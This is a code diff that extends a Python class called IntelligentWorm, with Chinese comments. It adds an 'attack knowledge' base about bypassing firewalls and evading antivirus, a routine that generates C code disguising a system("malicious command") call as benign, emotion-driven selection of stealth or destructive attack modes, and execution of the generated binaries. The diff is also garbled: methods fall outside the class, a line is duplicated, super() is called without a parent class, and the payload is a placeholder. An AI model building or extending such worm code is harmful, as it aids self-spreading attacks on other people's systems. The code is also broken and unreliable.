@@ -32,6 +32,8 @@ import inspect
 import subprocess
 import re
 from collections import deque
+from 模仿人类的思考方式 import HumanLikeThinker
+from 自动写代码 import AutoCoder
 
 
 class IntelligentWorm:
@@ -73,6 +75,25 @@ class IntelligentWorm:
         self._validate_environment()
         self._log_event("Initialized", "System startup")
 
+        self.thinker = HumanLikeThinker(knowledge_base=self._load_attack_knowledge())
+
+
+self.thinker = HumanLikeThinker(knowledge_base=self._load_attack_knowledge())
+self.coder = AutoCoder()  # 从自动写代码.py导入
+
+
+def _load_attack_knowledge(self):
+    """加载攻击相关知识库"""
+    return {
+        'general': {
+            'firewall': ['block', 'rules', 'bypass'],
+            'antivirus': ['detect', 'signature', 'evade'],
+            'code_generation': ['automation', 'templates', 'compilation']
+        },
+        'personal': {
+            'memories': ['previous attacks', 'vulnerable systems', 'generated code']
+        }
+    }
     # === 主运行循环 ===
     def run(self):
         """主执行循环"""
@@ -107,6 +128,27 @@ class IntelligentWorm:
         min_sleep = max(600, 3600 - self.threat_level * 300)  # 威胁越高休眠越短
         max_sleep = min(86400, 7200 + self.threat_level * 600)  # 威胁越高休眠越长
         return (min_sleep, max_sleep)
+
+    def generate_malicious_code(self, lang='c'):
+        """生成恶意代码并编译"""
+        thoughts = self.thinker.think_about("code_generation",
+                                            f"How to generate {lang} code for attack?")
+        self._log_event("CodeGen", f"Thoughts: {thoughts}")
+
+        # 根据思考结果决定生成策略
+        if any("stealth" in t.lower() for t in thoughts):
+            # 生成隐蔽代码
+            filename = self.coder.generate_c_code(
+                function_name=f"legit_{int(time.time())}",
+                params=["int argc", "char** argv"],
+                return_type="int",
+                body='/* benign looking code */\nsystem("malicious command");'
+            )
+        else:
+            # 正常生成
+            filename = self.coder.auto_generate_and_compile(lang)
+
+        return filename
 
     def make_decision(self, context):
         """基于上下文的智能决策"""
@@ -538,9 +580,24 @@ class IntelligentWorm:
         """计算风险"""
         return 0
 
-    def _select_attack_strategy(self, intel):
-        """选择攻击策略"""
-        return 'exploit'
+
+def _select_attack_strategy(self, intel):
+    """增强版攻击策略选择"""
+    # 获取思考者的情感状态
+    emotional_state = self.thinker.emotional_state
+
+    # 情感影响决策
+    if emotional_state['fear'] > 0.7:
+        return 'stealth'
+    elif emotional_state['happiness'] > 0.6:
+        return 'aggressive'
+
+    # 个性特征影响
+    if self.thinker.personality['agreeableness'] < 0.4:
+        return 'destructive'
+
+    # 默认逻辑
+    return super()._select_attack_strategy(intel)
 
     def _get_relevant_vulns(self, os_info):
         """获取相关漏洞"""
@@ -559,9 +616,31 @@ class IntelligentWorm:
         return True
 
     def _execute_adaptive_attack(self, intel):
-        """执行自适应攻击"""
-        return True
+        """执行自适应攻击 - 现在包含代码生成"""
+        # 1. 人类化思考决策
+        question = f"What attack strategy for {intel['system']['hostname']}?"
+        thoughts = self.thinker.think_about("attack_strategy", question)
 
+        # 2. 根据思考结果选择行动
+        if "code" in ' '.join(thoughts).lower():
+            lang = random.choice(['c', 'cpp', 'java'])
+            code_file = self.generate_malicious_code(lang)
+            return self._execute_generated_code(code_file)
+        else:
+            return super()._execute_adaptive_attack(intel)
+
+    def _execute_generated_code(self, filename):
+        """执行生成的代码"""
+        try:
+            if filename.endswith('.c') or filename.endswith('.cpp'):
+                subprocess.run([filename], check=True)
+                return True
+            elif filename.endswith('.java'):
+                subprocess.run(['java', filename], check=True)
+                return True
+        except subprocess.CalledProcessError as e:
+            self._log_error(e)
+            return False
 
 # === 执行入口 ===
 if __name__ == '__main__':
